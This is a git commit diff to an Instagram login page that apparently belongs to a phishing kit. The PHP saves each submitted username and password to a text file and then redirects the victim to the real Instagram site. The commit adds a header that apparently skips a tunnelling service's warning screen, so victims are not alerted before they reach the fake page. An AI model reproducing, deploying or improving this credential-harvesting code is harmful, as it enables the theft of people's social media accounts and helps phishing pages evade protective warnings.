4dd04dbfb9f4db3b6633a096019a336de4f72c45
J R Deva Dattan <jrdevadattan2006@gmail.com>
2025-08-09 13:14:04 +0530

    Update login.php

--- .sites/instagram/login.php
+++ .sites/instagram/login.php
@@ -1,5 +1,5 @@
 <?php
-
+header("X-Pinggy-No-Screen: 1");
 file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://instagram.com');
 exit();
